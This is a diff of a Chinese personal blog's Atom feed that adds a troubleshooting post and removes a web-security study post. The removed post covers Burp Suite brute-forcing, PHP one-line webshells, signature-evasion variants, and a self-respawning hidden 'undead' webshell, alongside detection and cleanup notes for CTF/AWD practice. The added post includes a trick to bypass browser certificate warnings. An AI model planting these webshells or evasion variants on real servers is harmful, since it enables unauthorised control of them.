@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2021-08-19T01:43:38.411Z</updated>
+  <updated>2021-08-22T02:43:09.151Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -21,8 +21,15 @@
     <link href="http://example.com/2021/08/16/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
     <id>http://example.com/2021/08/16/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</id>
     <published>2021-08-16T15:58:27.000Z</published>
-    <updated>2021-08-19T01:43:38.411Z</updated>
+    <updated>2021-08-22T02:43:09.151Z</updated>
     
+    <content type="html"><![CDATA[<h2 id="RE初步学习"><a href="#RE初步学习" class="headerlink" title="RE初步学习"></a>RE初步学习</h2><h3 id="X86汇编"><a href="#X86汇编" class="headerlink" title="X86汇编"></a>X86汇编</h3>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;RE初步学习&quot;&gt;&lt;a href=&quot;#RE初步学习&quot; class=&quot;headerlink&quot; title=&quot;RE初步学习&quot;&gt;&lt;/a&gt;RE初步学习&lt;/h2&gt;&lt;h3 id=&quot;X86汇编&quot;&gt;&lt;a href=&quot;#X86汇编&quot; class=&quot;headerlink&quot; title=</summary>
+      
     
     
     
@@ -82,26 +89,6 @@
       
       
     <summary type="html">&lt;h2 id=&quot;WEB初步学习&quot;&gt;&lt;a href=&quot;#WEB初步学习&quot; class=&quot;headerlink&quot; title=&quot;WEB初步学习&quot;&gt;&lt;/a&gt;WEB初步学习&lt;/h2&gt;&lt;h3 id=&quot;PHP-amp-amp-SSRF&quot;&gt;&lt;a href=&quot;#PHP-amp-amp-SSRF&quot;</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>第七篇博客</title>
-    <link href="http://example.com/2021/08/01/%E7%AC%AC%E4%B8%83%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
-    <id>http://example.com/2021/08/01/%E7%AC%AC%E4%B8%83%E7%AF%87%E5%8D%9A%E5%AE%A2/</id>
-    <published>2021-08-01T03:48:16.000Z</published>
-    <updated>2021-08-15T08:17:20.897Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="WEB初步学习"><a href="#WEB初步学习" class="headerlink" title="WEB初步学习"></a>WEB初步学习</h2><h3 id="web入门简介"><a href="#web入门简介" class="headerlink" title="web入门简介"></a>web入门简介</h3><p>注：还需进一步了解菜刀蚁剑 </p><p>####Burpsuit功能介绍 </p><p><strong>burpsuit简介：</strong></p><p>Burp Suite 是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、 </p><p>警报。</p><p><strong>安装与使用：</strong> </p><p>注：burpsuit（后续或简称BP）使用需设置好bat和浏览器</p><ol><li><p>需要安装好JDK，Burpsuit 2020.12需要安装jdk9以上的版本</p></li><li><p>下载burpsuit压缩包，解压后，双击bat文件打开</p></li><li><p>在proxy-options中添加端口，点add进行添加后在bind to port中输入所要监听的端口，使用时要勾上running的选项</p></li><li><p>浏览器-选项-网络设置（设置成手动配置代理，将HTTP代理设置成与BP中所添加的IP地址与端口一致）</p></li></ol><p>全部完成后即可在BP中进行抓包，如果需要停下则将网络设置改为不适用代理服务。或者使用插件一键管理代理服务器。（例如：火狐中可用foxyproxy；谷歌中可用switchyomega——&gt;如果需要抓取像127.0.0.1般环回地址的信息则需要将“不代理的地址列表”的内容改为&lt;-loopback&gt;）</p><p><strong>拦截https请求包：</strong></p><p>拦截https请求包，需要在浏览器里面导入burp的证书</p><p>证书可以在burp里面下载（在proxy-options中找到导出证书），也可以访问http：//burp下载）然后在浏览器里面导入（浏览器-选项-隐私与安全-查看证书-导入），完成后即可进行抓取</p><p>代理模块是burpsuit最核心的功能，相当于客户端和服务器之间中间人的角色，可以拦截、查看、修改数据包。 </p><img src="/images/%E7%AC%AC%E4%B8%83%E7%AF%87%E5%8D%9A%E5%AE%A2/image-20210731235427803.png" alt="image-20210731235427803" style="zoom: 67%;" /><p>intercept ：可以查看，修改http数据包的内容。可以把数据包发送到其他模块。</p><p>httphistory：查看所有经过代理服务器的数据流及详情.</p><p>WebSockets history：主要用于记录WebSockets的数据包</p><p>options：对代理服务的一些设置，如：代理监听的端口、请求包的拦截规则等。</p><p>drop：用于丢弃无用包</p><p>action：含有对数据包的一些操作</p><p>[演示:抓包修改包内容]</p><p>在浏览器中打开BP代理后，在BP的proxy代理模块中点击intercept进行拦截，而后可以在intercept is on中查看/修改抓取到的内容，并利用forward发送出去。</p><p>repeater模块即重放攻击模块。右键选择send to repeater后即可进行多次修改请求包，无需每次修改都要进行重新抓包。而后点击sand则在界面右侧会出现相应包。</p><p><strong>intruder模块：</strong></p><p>intruder：爆破模块。将所有可能的密码写在一个文件里形成密码字典，进行依次试密码。在intruder-positions中标记需要进行爆破的位置，可先用clear进行清楚系统自动标记的爆破位置而后用add添加标记。</p><p>accack type：爆破方式</p><p>1.sniper：依次进行破解</p><p>2.battering ram：对变量同时破解</p><p>3.pitchfork：每个变量对应一个字典，取各自字典的对应项进行破解</p><p>4.cluster bomb：每个变量对应一个字典，进行交叉破解，尝试多个字典的各种组合，适用于破解用户名和密码等</p><p>如果在intruder-payloads中的payload type选择simple list（字典模式）则应该在payload options（simple list）中导入要爆破的字典（会根据所选择模式进行改变）。可以选择load导入自行下载的；也可以选择add form list导入系统自带的。设置好后点击start attack进行爆破。</p><p>如果想要提高爆破速度可以将intruder-options-request engine中number of threads的数值（并发线程数）进行增加，但不是越大越好，如果过高那某些网站可能会把IP给down掉</p><p>302状态代表重定向，200状态代表访问成功。</p><p><strong>decode模块：</strong></p><p>burp里的编码解码工具，可以进行一些编码转换、hash加密，还有个智能解码的功能。可进行多次编码解码。</p><p>有需要对内容进行编码解码的可以复制到decode模块也可以右键选择send to decode进行发送。</p><p>####一句话木马破解 </p><p><strong>定义：</strong>一句话木马，它是个可执行脚本文件，把脚本文件上传到目标服务器然后文件被解析执行，就可以达到控制目标服务器的目的。</p><p><strong>小知识：</strong>一句话木马简短。根据网站的语言决定木马类型。 </p><p><strong>上传木马，攻击成功必须满足的三个条件：</strong></p><p>1.木马能成功上传到服务器；2.我们知道木马上传到服务器的路径；3.上传的木马能被解析执行。</p><p>下面主讲php类型的木马：</p><p>原理：</p><pre><code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code></pre><p>php：表示此代码为php类型即php代码，php服务器识别到此字段/标志才能解析执行</p><p>@：代表不报错，即使运行出现了错误也不会报错；</p><p>$_POST[‘cmd’]：以post方法获取一个为cmd的参数</p><p>eval：将括号里的函数当作php代码执行</p><p>整句代码的含义：以post方法获取cmd参数，再将所获取的字符串当作php代码进行执行。例如：传入cmd=phpinfo()即<code>&lt;?php @eval(&quot;phpinfo();&quot;);?&gt;</code></p><p>phpinfo()包含php当前状态的大量信息（编译选项、环境变量、编译版本、服务器信息等），若被他人窥视会导致数据泄露</p><p>eval有时可以用assert代替，<strong>eval和assert的区别：</strong></p><p>相同点：都能把字符串作为PHP代码执行</p><p>不同点：eval()不能被可变函数（函数名通过变量传入）调用。eval()函数实际是一个语言构造器，相当于C语言中的预定义宏，属于PHP语言内部关键字。php支持动态函数调用，而eval不支持。</p><p>动态调用：<code>&lt;?php @eval(&quot;phpinfo();&quot;);?&gt;</code>效果相当于</p><pre><code class="php">&lt;?php  a=&quot;phpinfo()&quot;; //定义一个a变量为字符串phpinfo()  $a(); //变成函数?&gt;</code></pre><p>注：php7.1以上assert函数已经被废弃</p><p>上传一句话木马时，可利用HackBar插件进行上传等。</p><p>可通过<code>cmd=system(whoani);</code>命令来输出服务器的用户名</p><p>==！！！不可随意上传木马，以免触犯法律==</p><p><strong>木马的各种变形：</strong></p><p>传统的木马防护检测一般是基于特征检测的防护，如：正则表达式和黑名单（例如将eval函数列为黑名单，含有其的文件进行删除，以此达到防木马的目的）。</p><p>传统防护检测的免杀方法：</p><p><u>思路一：隐藏关键字</u>（简记：利用各种该方法将assert拆分再组合或者转换变形等）</p><p>1.绕过php代码标志&lt;?的限制：</p><pre><code>&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#39;x&#39;])&lt;/script&gt;</code></pre><p>2.拆分拼接：</p><pre><code class="php">&lt;?php$arr=explode(&quot;,&quot;,&quot;a,s,d,f,s,d,e,r,t&quot;);//把字符串打散为数组$payload=$arr[0].$arr[4].$arr[6].$arr[8].$arr[9];//调用数组拼接成assert//php版本要求：≤7.0@$payload(@$_GET[&#39;x&#39;]);?&gt;</code></pre><p>3.编码</p><pre><code class="php">&lt;?php$a=base64_decode(&quot;YXNzZXJ0&quot;);//对assert进行base64编码再进行解码@$a($_POST(&#39;cmd&#39;));//组成函数名?&gt;</code></pre><p>4.随机异或，用异或运算来组成字符</p><pre><code class="php">&lt;?php//也可以用十六进制进行进一步加密，例如$r=&quot;x4d&quot;^&quot;x3f&quot;;$a=&quot;Y&quot;^&quot;8&quot;;//a$b=&quot;T&quot;^&quot;&quot;;//s$c=&quot;*&quot;^&quot;O&quot;;//e$d=&quot;M&quot;^&quot;?&quot;;//r$e=&quot;-&quot;^&quot;Y&quot;;//t$payload=$a.$b.$b.$c.$d.$e;//拼接成assert@$payload(@_POST_[&#39;x&#39;]);?&gt;</code></pre><p>5.可变函数</p><pre><code class="php">&lt;?php@$_REQUEST[&#39;e&#39;](@$_RERQUEST[&#39;x&#39;]);//传入e=assert函数名&amp;x=command命令?&gt;</code></pre><p>6.可变变量</p><pre><code class="php">&lt;?php$a=&#39;assert&#39;;$b=&#39;a&#39;;//$$b=$a=&#39;assert&#39;$$b($_POST[&#39;x&#39;]);//assert($_POST[&#39;x&#39;])?&gt;</code></pre><p><u>思维二：使用回调函数</u></p><p>回调函数：（简单说，就是在主函数中调用代码段，再将调用结果返回给主函数）PHP是将函数以string形式传递的。可以使用任何内置或用户自定义函数，但是除了语言结构例如：array(), echo, empty(), eval(), exit(), isset(), list(), print或unset().</p><p>其他回调函数:call_user_func_array、array _filter、register_tick_function、forward_static _call、……</p><p> 如：<code>call_user_func($callback,$parameter)</code></p><p>$$$callback$$：被调用的回调函数</p><p>$$$parameter$$：0个或以上的参数，被传入回调函数。</p><pre><code class="php">&lt;?php@call_user_func($_GET[&#39;id&#39;],$_POST[&#39;a&#39;]);//传入id=eval&amp;a=command?&gt;</code></pre><p>注：常见的回调函数大部分都会被过滤掉，应该考虑少见的回调函数，可以在php手册中进行关键字搜索。 </p><p><strong>木马的使用：</strong></p><p>1.执行系统的命令：</p><p>system()–执行外部程序，并显示输出</p><p>passthru()–执行外部程序并且显示原始输出</p><p>exec()–执行一个外部程序，不输出结果，echo返回结果的最后一行。</p><p>shell_exec()或``–通过shell环境执行命令，需要echo进行结果打印，如echo exec()</p><p>2、读文件:可用var_dump()函数进行全部数据的读取输出</p><p>file_get_contents–将整个文件读入为一个字符串</p><p>file()–把整个文件读入一个数组中（直接读取，无需echo等）</p><p>readfile–读取一个文件，并写入到输出缓冲</p><p>3、遍历目录:</p><p>scandir()–函数返回一个指定目录中的文件和目录的数组。</p><p><strong>木马的特征与查杀（AWD）：</strong></p><p>基于特征检测，检测敏感关键字，如“危险函数、特殊函数</p><p>工具：D盾</p><p>1、代码执行函数:</p><p>eval；assert；pre_ replace（正则替换函数）；create_ function；回调函数call user. func. call. user. func .array. register tick. function、array filter等等</p><p>2.命令执行函数:</p><p>exec()–执行一个外部程序；</p><p>passthru()–执行外部程序并且显示原始输出；</p><p>proc open()– 执行一个命令,并且打开用来输入/输出的文件指针；</p><p>shell_ exec()或``–通过shel环境执行命令；</p><p>system()–执行外部程序，并显示输出；</p><p>popen()–通过参数传递一条命令, 并对popen打开的文件执行</p><p>3.文件操作函数: </p><p>file_ get contents–将整个文件读入为一个字符串；</p><p>file_ put_ contents–将一个字符串写入文件；</p><p>file()–把整个文件读入一个数组；</p><p>fopen–打开文件或者URL；</p><p>move_ uploaded file–将上传的文件移动到新位置；</p><p>readfile–读取一个文件，并写入到输出缓冲；</p><p>rename–重命名一个文件或目录；</p><p>rmdir–删除目录；</p><p>unlink &amp; delete –删除文件</p><p>4.包含函数:</p><p>-require. require. once-include. include. once</p><p>5.特殊函数:</p><p>-phpinfo</p><p>-变量覆盖 parse_ str. extract</p><p>小知识：检查是否有被上传木马，可先将文件夹放入D盾里查杀（可将文件拖入/选择目录进行导入），D盾里的规则库会根据特征检测出有无漏洞。扫描后为可能存在漏洞，可再人工审计一遍确认。</p><p><strong>不死马：</strong> </p><p>定义：不死马即内存马，它无文件，但程序会永久的运行在PHP进程中，无限执行，很隐蔽不易被发现，也不容易被删除。 </p><pre><code class="php">&lt;?phpignore_user_abort(true);//此函数用来设置客户机断开后是否会终止脚本的执行，设置成true,客户机断开后脚本仍然会执行。set_time_limit(0);//设置脚本最大执行时间，设为0表示没有限制。unlink(__FILE__);//删除文件本身，起到隐蔽自身的作用。$file = &#39;./.index1.php&#39;;//文件名前面有点表示在Linux系统中为隐藏文件$code = &#39;&lt;?phpif(md5($_POST[&quot;pass&quot;])==&quot;5c44d3ed7462245f57b37f8fe2a3d5de&quot;)&#123;@eval($_POST[&quot;cmd&quot;]);&#125; ?&gt;&#39;;//一句话木马，pass=nepnep用法:pass=nepnep&amp;cmd=command，给pass加密防止木马被他人使用while (1)&#123;//开启无限循环     file_ put_ contents($file,$code);     system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot;.index1.php&#39;);//修改时间，防止被检查出文本修改而生成的最新时间     usleep(5000);//延迟执行当前脚本若干微秒&#125;?&gt;</code></pre><p>注：pass参数使用了MD5加密，防止木马被他人利用。</p><p><u>不死马的查杀</u>：</p><p>1、重启服务,比如php等web服务。</p><p>2、创建一个和不死马同名的文件夹。</p><p>3、删除相应进程。查出不死马进程PID后，用命令kill -9 PID杀掉进程。</p><p>4、竞争写入删除不死马的文件，usleep的时间必须要小于不死马的延迟时间。</p><p>####菜刀蚁剑使用介绍</p><p><strong>介绍：</strong>主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员，是 一 款比菜刀还牛的shell控制端软件。</p><p>小马：短小精悍，比如一句话木马,但实现的功能少；大马：脚本大小会比较庞大，但它能实现更复杂的功能。先传小马，再利用小马执行大马。菜刀、蚁剑等工具一键实现。</p><p><strong>工具原理：</strong>假设上传的一句话木马为: <code>&lt;?php @eval($_ POST[&#39;cmd&#39;]);?&gt;</code></p><p>蚁剑连接抓包：</p><img src="/images/%E7%AC%AC%E4%B8%83%E7%AF%87%E5%8D%9A%E5%AE%A2/QQ%E5%9B%BE%E7%89%8720210803223040.png" alt="QQ图片20210803223040" style="zoom: 67%;" />]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;WEB初步学习&quot;&gt;&lt;a href=&quot;#WEB初步学习&quot; class=&quot;headerlink&quot; title=&quot;WEB初步学习&quot;&gt;&lt;/a&gt;WEB初步学习&lt;/h2&gt;&lt;h3 id=&quot;web入门简介&quot;&gt;&lt;a href=&quot;#web入门简介&quot; class=&quot;headerlink</summary>
       
     
     
@@ -263,6 +250,26 @@
       
     <summary type="html">&lt;h2 id=&quot;BUUCTF&quot;&gt;&lt;a href=&quot;#BUUCTF&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF&quot;&gt;&lt;/a&gt;BUUCTF&lt;/h2&gt;&lt;p&gt;注释：建议在虚拟机中进行解题。&lt;/p&gt;
 &lt;h3 id=&quot;basic：&quot;&gt;&lt;a href=&quot;#basic：&quot; </summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>computer</title>
+    <link href="http://example.com/2021/07/11/computer/"/>
+    <id>http://example.com/2021/07/11/computer/</id>
+    <published>2021-07-11T02:29:55.000Z</published>
+    <updated>2021-08-23T01:15:39.233Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="电脑issue"><a href="#电脑issue" class="headerlink" title="电脑issue"></a>电脑issue</h2><p>注：由于是个电脑小白，经常把电脑弄得各种问题，所以写个问题清单，希望方便查找并帮助遇到同样问题的人，如有不对看到的大佬请指教。</p><ol><li><p>问题：网络连接不上，wifi那栏只剩如下图的三个选项：</p><img src="/images/computer/image-20210822103735325.png" alt="image-20210822103735325" style="zoom:50%;" /><p>解决方法：点击网络和internet设置找到网络重置：</p><img src="/images/computer/image-20210822103833199.png" alt="image-20210822103833199" style="zoom:33%;" /></li><li><p>问题：浏览器使用着突然访问提示该连接不是私密/专用连接：</p><img src="/images/computer/image-20210822114435579.png" alt="image-20210822114435579" style="zoom:30%;" /><p>解决方法一：切换至英文输入模式，点击页面任意位置输入“thisisunsafe”则刷新后可用，但治标不治本。</p><p>解决方法二：万能重启！（我是重启了之后会变好，但也不是长久之计）</p><p>解决方法三：还没找到根治的方法，疑因我的安全证书出现问题。</p><p>注：附上“在 Microsoft Edge 中安全浏览 Web时地址栏中的连接图标四种不同的状态对应的含义”的学习连接：<a href="https://support.microsoft.com/zh-cn/microsoft-edge/%E5%9C%A8-microsoft-edge-%E4%B8%AD%E5%AE%89%E5%85%A8%E6%B5%8F%E8%A7%88-web-c7beb47a-de9e-4aec-839d-28224a13a5d2">在 Microsoft Edge 中安全浏览 Web</a></p></li><li><p>问题：如何查找某个端口是否被占用</p><p>解决方法：win+R唤出命令窗口，输入netstat -aon|findstr “端口”</p><p>如果没有被占用则返回空，有则返回占用情况：</p><img src="/images/computer/image-20210822113651717.png" alt="image-20210822113651717" style="zoom: 67%;" /></li><li></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;电脑issue&quot;&gt;&lt;a href=&quot;#电脑issue&quot; class=&quot;headerlink&quot; title=&quot;电脑issue&quot;&gt;&lt;/a&gt;电脑issue&lt;/h2&gt;&lt;p&gt;注：由于是个电脑小白，经常把电脑弄得各种问题，所以写个问题清单，希望方便查找并帮助遇到同样问题的人，</summary>
       
     
     
